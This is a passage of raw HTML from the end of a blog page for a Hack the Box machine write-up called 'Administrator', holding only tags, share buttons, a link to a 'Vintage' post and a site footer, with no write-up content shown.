May 5, 2025</time><div class="container mx-auto prose prose-slate lg:prose-xl dark:prose-invert mt-5"><div class="max-w-prose print:hidden"><div class="flex justify-center"><a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/windows/>Windows</a>
<a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/active-directory/>Active Directory</a>
<a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/hack-the-box/>Hack the Box</a></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet?url=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fadministrator-htb%2F&amp;text=Administrator" title=X aria-label=X id=share-link-x><svg style="height:1em" viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer.php?u=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fadministrator-htb%2F&amp;t=Administrator" title=Facebook aria-label=Facebook id=share-link-facebook><svg style="height:1em" viewBox="0 0 24 24"><path fill="currentcolor" d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55.0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?subject=Administrator&amp;body=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fadministrator-htb%2F" title=Email aria-label=Email id=share-link-email><svg style="height:1em" viewBox="0 0 24 24"><path fill="none" stroke="currentcolor" stroke-linecap="round" stroke-width="1.5" d="M16.5 12a4.5 4.5.0 11-9 0 4.5 4.5.0 019 0zm0 0c0 1.657 1.007 3 2.25 3S21 13.657 21 12a9 9 0 10-2.636 6.364M16.5 12V8.25"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?url=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fadministrator-htb%2F&amp;title=Administrator" title=LinkedIn aria-label=LinkedIn id=share-link-linkedin><svg style="height:1em" height="1em" viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="whatsapp://send?text=Administrator%20http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fadministrator-htb%2F" title=WhatsApp aria-label=WhatsApp id=share-link-whatsapp><svg style="height:1em" viewBox="0 0 256 256" fill="currentcolor"><path d="m187.58 144.84-32-16a8 8 0 00-8 .5l-14.69 9.8a40.55 40.55.0 01-16-16l9.8-14.69a8 8 0 00.5-8l-16-32A8 8 0 00104 64a40 40 0 00-40 40 88.1 88.1.0 0088 88 40 40 0 0040-40 8 8 0 00-4.42-7.16zM152 176a72.08 72.08.0 01-72-72 24 24 0 0119.29-23.54l11.48 23L101 118a8 8 0 00-.73 7.51 56.47 56.47.0 0030.15 30.15A8 8 0 00138 155l14.61-9.74 23 11.48A24 24 0 01152 176zM128 24A104 104 0 0036.18 176.88l-11.35 34.05a16 16 0 0020.24 20.24l34.05-11.35A104 104 0 10128 24zm0 192a87.87 87.87.0 01-44.06-11.81 8 8 0 00-6.54-.67L40 216l12.47-37.4a8 8 0 00-.66-6.54A88 88 0 11128 216z"/></svg></a></section><div class="pt-1 no-prose w-full"><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex flex-col md:flex-row flex-nowrap justify-between gap-5 pt-2"><div><a class="group flex no-underline" href=/blog/vintage-htb/><span class="mt-[-0.3rem] me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"><span class="ltr:inline rtl:hidden">&larr;</span></span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Vintage</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">May 10, 2025</span></span></a></div><div></div></div></div><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class=text-sm><h3>Related</h3><ul><li><a href=/blog/vintage-htb/>Vintage</a></li></ul></div></div></div></main></article></div></div><div class=page-footer><p class="text-muted mb-0" style="margin:0 auto;text-align:center;width:100%">© 2025 0xseclab | All rights reserved</p></div></body></html>